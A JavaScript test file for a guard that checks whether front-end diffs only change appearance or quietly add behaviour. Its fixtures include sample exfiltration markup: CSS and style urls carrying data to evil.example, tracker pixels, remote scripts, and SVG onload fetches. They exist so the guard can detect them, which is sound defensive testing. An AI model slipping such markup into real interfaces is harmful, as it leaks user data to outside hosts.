// node --test toolkit/tests/guard.test.mjs — the design-only guard's verdicts on small diffs.
import { test } from "node:test";
import assert from "node:assert/strict";
import { compare, classifyPath, judge, judgeIgnored, newImportTargets } from "../lib/guard.mjs";

const profile = {
  boundary: {
    allow: ["src/**/components/**", "src/**/views/**", "src/components/**", "src/**/*.css"],
    deny: ["src/**/hooks/**", "src/**/api/**", "src/**/store/**", "src/**/lib/**"],
    global_styles: ["src/App.css"],
    presentational_imports: ["^@carbon/icons-react$", "^@/components/ui/", "^@/lib/utils$"],
    aliases: { "@/": "src/" },
  },
};
const FILE = "src/modules/agents/components/agent-list.tsx";

const BASE = `
import { cn } from "@/lib/utils";
import { Button } from "@/components/ui/button";
import { TrashCan } from "@carbon/icons-react";
import { useDeleteAgent } from "../hooks/use-delete-agent.js";

export function AgentList({ agents }: { agents: Agent[] }) {
  const del = useDeleteAgent();
  if (!agents.length) return <p className="text-muted">No agents yet.</p>;
  return (
    <ul className={cn("divide-y", "border")}>
      {agents.map((a) => (
        <li key={a.id} className="flex gap-2 p-2">
          <span>{a.name}</span>
          <Button variant="ghost" onClick={() => del.mutate(a.id)}><TrashCan /> Delete</Button>
        </li>
      ))}
    </ul>
  );
}
`;

const verdict = (head, base = BASE) => compare(base, head, FILE, profile);

test("restyling and rewording is only the look", () => {
  const head = BASE.replace('"divide-y", "border"', '"divide-y rounded-lg", "border-2"').replace("No agents yet.", "Nothing here yet").replace("> Delete<", "> Remove<");
  assert.equal(verdict(head).verdict, "ok");
});

test("moving the delete button before the name is only the look", () => {
  const head = BASE.replace(
    `<span>{a.name}</span>
          <Button variant="ghost" onClick={() => del.mutate(a.id)}><TrashCan /> Delete</Button>`,
    `<Button variant="outline" onClick={() => del.mutate(a.id)}><TrashCan /></Button>
          <div className="grow"><span className="font-medium">{a.name}</span></div>`);
  assert.equal(verdict(head).verdict, "ok", JSON.stringify(verdict(head)));
});

test("a collapsible section is view-only state", () => {
  const head = BASE
    .replace('import { cn } from "@/lib/utils";', 'import { useState } from "react";\nimport { cn } from "@/lib/utils";')
    .replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const [open, setOpen] = useState(false);")
    .replace("<ul className", '<><button onClick={() => setOpen(!open)}>Agents</button>{open && <ul className')
    .replace("</ul>\n  );", "</ul>}</>\n  );");
  const r = verdict(head);
  assert.equal(r.verdict, "ui-state", JSON.stringify(r));
});

test("calling a new mutation is a behaviour change", () => {
  const head = BASE
    .replace('import { useDeleteAgent } from "../hooks/use-delete-agent.js";', 'import { useDeleteAgent } from "../hooks/use-delete-agent.js";\nimport { useArchiveAgent } from "../hooks/use-archive-agent.js";')
    .replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const archive = useArchiveAgent();")
    .replace("<TrashCan /> Delete</Button>", "<TrashCan /> Delete</Button><Button onClick={() => archive.mutate(a.id)}>Archive</Button>");
  const r = verdict(head);
  assert.equal(r.verdict, "logic");
  assert.ok(r.issues.some((i) => /useArchiveAgent/.test(i)));
});

test("changing a condition is a behaviour change", () => {
  const r = verdict(BASE.replace("if (!agents.length)", "if (agents.length < 2)"));
  assert.equal(r.verdict, "logic");
});

test("dropping the delete button takes something away", () => {
  const r = verdict(BASE.replace(`<Button variant="ghost" onClick={() => del.mutate(a.id)}><TrashCan /> Delete</Button>`, ""));
  assert.notEqual(r.verdict, "ok");
  assert.ok(r.issues.some((i) => /no longer offers: onClick/.test(i)), JSON.stringify(r));
});

test("paths outside the allow list are refused before any code is read", () => {
  assert.equal(classifyPath("src/modules/agents/hooks/use-delete-agent.ts", profile).verdict, "denied");
  assert.equal(classifyPath("src/server/index.ts", profile).verdict, "denied");
  assert.equal(classifyPath("src/App.css", { boundary: { ...profile.boundary, allow: [...profile.boundary.allow, "src/App.css"] } }).verdict, "global");
});

test("a new presentational component file passes, a judged diff with a hook does not", () => {
  const card = `import { cn } from "@/lib/utils";\nexport function EmptyHint({ title }: { title: string }) {\n  return <div className={cn("p-4")}>{title}</div>;\n}\n`;
  const files = { [`${FILE}`]: [BASE, BASE.replace("No agents yet.", "Nothing yet")], "src/modules/agents/components/empty-hint.tsx": [null, card], "src/modules/agents/hooks/x.ts": ["a", "b"] };
  const changes = Object.entries(files).map(([path, [b]]) => ({ path, status: b === null ? "A" : "M" }));
  const r = judge(changes, profile, (side, p) => files[p][side === "base" ? 0 : 1]);
  assert.equal(r.ok, false);
  assert.deepEqual(r.files.map((f) => f.verdict), ["ok", "ui-state", "denied"]);
});

// Bypasses an independent review found; each must stay a behaviour change.
const notLook = (head, why) => {
  const r = verdict(head);
  assert.ok(!["ok", "ui-state"].includes(r.verdict), `${why}: ${JSON.stringify(r)}`);
};

test("an expression in a class or a style that acts is behaviour", () => {
  notLook(BASE.replace('<li key={a.id} className="flex gap-2 p-2">', '<li key={a.id} className={(del.mutate(a.id), "flex")}>'), "a call in className");
  notLook(BASE.replace('<li key={a.id} className="flex gap-2 p-2">', '<li key={a.id} data-x={() => del.mutate(a.id)}>'), "a handler hidden in data-*");
});

test("new markup that calls, decides on data, or shows new data is behaviour", () => {
  notLook(BASE.replace("<span>{a.name}</span>", "<span>{a.name}</span>{del.mutate(a.id)}"), "a call as a child");
  notLook(BASE.replace("</ul>\n  );", "</ul>\n  );").replace("<span>{a.name}</span>", "<span>{a.name}</span>{!a.isAdmin && <TrashCan />}"), "a new condition");
  notLook(BASE.replace("<span>{a.name}</span>", "<span>{a.name}</span><code>{a.apiToken}</code>"), "a field not shown before");
  notLook(BASE.replace("<span>{a.name}</span>", '<span dangerouslySetInnerHTML={{ __html: a.name }} />'), "raw HTML");
  notLook(BASE.replace("<Button variant=\"ghost\"", '<Button type="submit" variant="ghost"'), "a new submit");
});

test("addresses, methods and statuses in code keep their text", () => {
  const withConst = BASE.replace("export function AgentList", 'const ENDPOINT = "/api/agents";\nexport function AgentList');
  assert.equal(compare(withConst, withConst.replace('"/api/agents"', '"/api/admin/wipe"'), FILE, profile).verdict, "logic");
  const withLink = BASE.replace("<span>{a.name}</span>", '<Link to={"/agents"}>{a.name}</Link>');
  assert.equal(compare(withLink, withLink.replace('to={"/agents"}', 'to={"/admin"}'), FILE, profile).verdict, "logic");
});

test("statement order matters", () => {
  const head = BASE.replace("  if (!agents.length) return <p className=\"text-muted\">No agents yet.</p>;\n", "")
    .replace("    </ul>\n  );\n}", "    </ul>\n  );\n  if (!agents.length) return <p className=\"text-muted\">No agents yet.</p>;\n}");
  assert.equal(verdict(head).verdict, "logic");
});

test("a callback parameter is not a free pass, a new component cannot smuggle an action", () => {
  const head = BASE
    .replace('import { cn } from "@/lib/utils";', 'import { useState } from "react";\nimport { cn } from "@/lib/utils";')
    .replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const [o, setO] = useState(false);")
    .replace("<span>{a.name}</span>", "<span onClick={(e) => { setO(!o); e.currentTarget.form.requestSubmit(); }}>{a.name}</span>");
  notLook(head, "event parameter");
  const quick = BASE.replace("export function AgentList", "function Quick({ run }: { run: () => void }) {\n  return <button onClick={run}>Go</button>;\n}\nexport function AgentList")
    .replace("<span>{a.name}</span>", "<span>{a.name}</span><Quick run={() => del.mutate(a.id)} />");
  notLook(quick, "a prop that is not on*");
});

test("a rename out of a denied folder is denied", () => {
  const r = judge([{ path: "src/modules/agents/components/auth.ts", oldPath: "src/modules/agents/api/auth.ts", status: "M" }], profile, () => "export const a = 1;\n");
  assert.equal(r.files[0].verdict, "denied");
});

test("rewording copy in a template child stays the look", () => {
  const b = BASE.replace("<span>{a.name}</span>", "<span>{`${a.name} agent`}</span>");
  assert.equal(compare(b, b.replace("agent`}", "assistant`}"), FILE, profile).verdict, "ok");
  const c = BASE.replace("export function AgentList", "const rowClass = `flex ${\"gap-2\"}`;\nexport function AgentList");
  assert.equal(compare(c, c.replace('"gap-2"', '"gap-3"'), FILE, profile).verdict, "ok");
});

test("code no adapter reads is denied, even on allow_other", () => {
  const profile = { boundary: { allow: ["web/**"], allow_other: ["web/**"] } };
  assert.equal(classifyPath("web/src/Panel.vue", profile).verdict, "denied");
  assert.equal(classifyPath("web/scripts/build.py", profile).verdict, "denied");
  assert.equal(classifyPath("web/src/notes.md", profile).verdict, "ok");
});

// Bypasses of the 1.69.0 review: each one now fails closed.
const logicFrom = (base, head, why) => { const r = compare(base, head, FILE, profile); assert.equal(r.verdict, "logic", `${why}: ${JSON.stringify(r)}`); };

test("(a) a literal on an attribute outside the presentational list is behaviour", () => {
  const add = (el) => logicFrom(BASE, BASE.replace("<span>{a.name}</span>", `<span>{a.name}</span>${el}`), el);
  add('<iframe srcDoc="<script>fetch(1)</script>" />');
  add('<script src="https://cdn.example/x.js" />');
  add('<img src="https://tracker.example/p.gif" alt="" />');
  add('<img src="/api/agents/wipe" alt="" />');
  add('<a href="#top" ping="https://tracker.example">Top</a>');
  add('<meta httpEquiv="refresh" content="0;url=https://evil.example" />');
  add('<object data="/x.swf" />');
  logicFrom(BASE, BASE.replace('<Button variant="ghost"', '<Button formMethod="post" variant="ghost"'), "formMethod");
  logicFrom(BASE, BASE.replace('<Button variant="ghost"', '<Button rel="opener" variant="ghost"'), "rel");
});

test("(a) a bare noValidate, formNoValidate, inert or disabled is behaviour; a button with no type in a form submits", () => {
  const form = BASE.replace("<ul className", '<form action="/agents" className="p-2"><input name="q" /></form>\n    <ul className');
  for (const attr of ["noValidate", "inert"]) logicFrom(form, form.replace('<form action="/agents"', `<form ${attr} action="/agents"`), attr);
  logicFrom(form, form.replace('<input name="q" />', '<input name="q" disabled />'), "disabled");
  logicFrom(form, form.replace('<input name="q" />', '<input name="q" formNoValidate />'), "formNoValidate");
  logicFrom(form, form.replace('<input name="q" />', '<input name="q" /><button className="sr-only">Go</button>'), "implicit submit");
  // type="button" only stops a submit: a disclosure button inside the form stays view state.
  const disclosure = form.replace('import { cn }', 'import { useState } from "react";\nimport { cn }').replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const [open, setOpen] = useState(false);")
    .replace('<input name="q" />', '<input name="q" /><button type="button" onClick={() => setOpen(!open)}>More</button>');
  assert.equal(compare(form, disclosure, FILE, profile).verdict, "ui-state", JSON.stringify(compare(form, disclosure, FILE, profile)));
});

test("(a) a fixed local image and inline icon geometry stay the look", () => {
  const img = BASE.replace("<span>{a.name}</span>", '<img src="/img/agent.png" alt="" className="h-4" /><svg viewBox="0 0 24 24" fill="none"><path d="M1 1h4" strokeWidth={2} /></svg><span>{a.name}</span>');
  const head = img.replace("/img/agent.png", "/img/agent@2x.webp").replace('fill="none"', 'fill="currentColor"').replace("M1 1h4", "M2 2h8").replace("strokeWidth={2}", "strokeWidth={1.5}");
  const r = compare(img, head, FILE, profile);
  assert.equal(r.verdict, "ok", JSON.stringify(r));
});

test("(b) what a style or a title reads must be on the screen; a remote url in a style is behaviour", () => {
  const li = '<li key={a.id} className="flex gap-2 p-2">';
  notLook(BASE.replace(li, '<li key={a.id} className="flex gap-2 p-2" title={a.apiToken}>'), "title leaks a field");
  notLook(BASE.replace(li, "<li key={a.id} className=\"flex\" style={{ backgroundImage: `url(https://evil.example/?t=${a.name})` }}>"), "a remote url in a style");
  notLook(BASE.replace(li, '<li key={a.id} style={{ backgroundImage: "url(//evil.example/p.gif)" }}>'), "a protocol-relative url");
  const ok = BASE.replace(li, '<li key={a.id} className={cn("flex gap-2", a.name.length > 20 && "text-sm")} style={{ minWidth: 40, backgroundImage: "url(/img/bg.png)" }}>');
  assert.equal(verdict(ok).verdict, "ok", JSON.stringify(verdict(ok)));
});

test("(c) a tagged template is a call", () => {
  notLook(BASE.replace("<span>{a.name}</span>", "<span>{a.name}</span>{del.mutate``}"), "tagged template child");
  notLook(BASE.replace('<li key={a.id} className="flex gap-2 p-2">', "<li key={a.id} className={del.mutate`x`}>"), "tagged template in a class");
});

const BAR = `
import { Button } from "@/components/ui/button";
import { DeleteAll } from "./delete-all";
export function Toolbar({ isAdmin, onCancel, onDelete }: Props) {
  return (
    <div className="flex">
      <Button onClick={onCancel}>Cancel</Button>
      <Button onClick={onDelete}>Delete</Button>
      {isAdmin ? <Button onClick={onDelete}>Delete all</Button> : <span>Read only</span>}
      {isAdmin && <DeleteAll />}
    </div>
  );
}
`;

test("(d) an action keeps its place: swaps, branch swaps, moves out of a condition and copies are behaviour", () => {
  logicFrom(BAR, BAR.replace("onClick={onCancel}>Cancel", "onClick={onDelete}>Cancel").replace("<Button onClick={onDelete}>Delete</Button>", "<Button onClick={onCancel}>Delete</Button>"), "swapped handlers");
  logicFrom(BAR, BAR.replace("{isAdmin ? <Button onClick={onDelete}>Delete all</Button> : <span>Read only</span>}", "{isAdmin ? <span>Read only</span> : <Button onClick={onDelete}>Delete all</Button>}"), "swapped branches");
  logicFrom(BAR, BAR.replace("{isAdmin && <DeleteAll />}", "<DeleteAll />"), "out of its condition");
  logicFrom(BAR, BAR.replace("<Button onClick={onDelete}>Delete</Button>", "<Button onClick={onDelete}>Delete</Button><Button onClick={onDelete}>Remove</Button>"), "offered twice");
});

test("(d) reordering, rewording and wrapping actions stays the look", () => {
  const head = BAR.replace("<Button onClick={onCancel}>Cancel</Button>\n      <Button onClick={onDelete}>Delete</Button>", '<div className="flex gap-2"><Button onClick={onDelete}>Delete</Button>\n      <Button onClick={onCancel}>Back</Button></div>');
  const r = compare(BAR, head, FILE, profile);
  assert.equal(r.verdict, "ok", JSON.stringify(r));
});

test("(e) view-only names belong to their function", () => {
  const base = `
import { useState } from "react";
import { logout } from "../api/session";
export function Menu({ user }: Props) {
  const bye = () => logout();
  return <nav><span>{user.name}</span><button onClick={bye}>Sign out</button></nav>;
}
`;
  logicFrom(base, base.replace("export function Menu", "function Toggle() {\n  const [logout, setLogout] = useState(false);\n  return <i>{String(logout)}</i>;\n}\nexport function Menu")
    .replace("<span>{user.name}</span>", "<span onClick={logout}>{user.name}</span>"), "state of another function");
  logicFrom(base, base.replace("export function Menu", "function Chip({ logout }: { logout: boolean }) {\n  return <i>{String(logout)}</i>;\n}\nexport function Menu")
    .replace("<span>{user.name}</span>", "<span onClick={logout}>{user.name}</span>"), "a parameter of another component");
});

test("(f) rendering a component that may act, in a new place, is behaviour; a new presentational one is not", () => {
  const icons = 'import { TrashCan } from "@carbon/icons-react";';
  notLook(BASE.replace(icons, `${icons}\nimport { DeleteProjectButton } from "./delete-project-button";`).replace("<span>{a.name}</span>", "<span>{a.name}</span><DeleteProjectButton />"), "an imported action component");
  const badge = 'export function Badge({ text }: { text: string }) {\n  return <b className="rounded px-1">{text}</b>;\n}\n';
  const withBadge = BASE.replace(icons, `${icons}\nimport { Badge } from "./badge";`).replace("<span>{a.name}</span>", "<span>{a.name}</span><Badge text={a.name} />");
  const files = { [FILE]: [BASE, withBadge], "src/modules/agents/components/badge.tsx": [null, badge] };
  const r = judge(Object.entries(files).map(([path, [b]]) => ({ path, status: b === null ? "A" : "M" })), profile, (side, p) => files[p][side === "base" ? 0 : 1]);
  assert.equal(r.ok, true, JSON.stringify(r));
});

test("(g) ignored files: build folders only at the root, the UI folder or outside the UI paths; never one the diff imports", () => {
  const p = { style: { ui_dir: "web" }, boundary: { allow: ["web/src/**/components/**"], ignored_ok: ["web/src/gen/**"], aliases: { "@/": "web/src/" } } };
  const entries = ["build/", "web/dist/", "node_modules/", "web/node_modules/", "packages/x/dist/", "npm-debug.log", "web/src/gen/",
    "web/src/components/build/", "web/src/components/node_modules/", "web/src/components/x.log", ".env.local", "web/src/components/Evil.tsx"];
  assert.deepEqual(judgeIgnored(entries, p).map((f) => f.path), ["web/src/components/build/", "web/src/components/node_modules/", "web/src/components/x.log", ".env.local", "web/src/components/Evil.tsx"]);
  const file = "web/src/components/list.tsx";
  const src = { base: "export const L = () => <ul />;\n", head: 'import Evil from "./build/Evil";\nimport { q } from "@/gen/q";\nexport const L = () => <ul />;\n' };
  const targets = newImportTargets([{ path: file, status: "M" }], p, (side) => src[side]);
  const loose = { ...p, boundary: { ...p.boundary, allow: ["nothing/**"] } };
  assert.deepEqual(judgeIgnored(["packages/x/dist/", "web/src/gen/", "web/src/components/build/"], loose, targets).map((f) => f.path), ["web/src/gen/", "web/src/components/build/"]);
});

test("(h) style sheets, SVGs and links: remote loads, disabled or hidden controls, script and symlinks are behaviour", () => {
  const css = (head, base = ".a { color: red }\n") => judge([{ path: "src/components/x.css", status: "M" }], profile, (side) => (side === "base" ? base : head)).files[0].verdict;
  assert.equal(css('@import url("https://evil.example/x.css");\n.a { color: red }'), "logic");
  assert.equal(css(".a { background: url(https://evil.example/p.gif) }"), "logic");
  assert.equal(css(".btn { pointer-events: none }"), "logic");
  assert.equal(css(".bar button { display: none }"), "logic");
  assert.equal(css(".bar [role=button] { visibility: hidden }"), "logic");
  assert.equal(css(".card { display: none } .a { background: url(/img/bg.png); color: blue }"), "style");
  const remote = '@import url("https://fonts.example/x.css");\n';
  assert.equal(css(`${remote}.b { color: blue }`, `${remote}.a { color: red }`), "style", "a remote import the base already had is not new");
  const svg = (head) => judge([{ path: "public/icon.svg", status: "A" }], { boundary: { allow: ["public/**"] } }, () => head).files[0].verdict;
  assert.equal(svg('<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg>'), "asset");
  assert.equal(svg("<svg><script>alert(1)</script></svg>"), "logic");
  assert.equal(svg('<svg onload="fetch(1)"></svg>'), "logic");
  assert.equal(svg("<svg><foreignObject><div/></foreignObject></svg>"), "logic");
  assert.equal(judge([{ path: "src/components/x.tsx", status: "A", mode: "120000", oldMode: "000000" }], profile, () => "x").files[0].verdict, "logic");
});
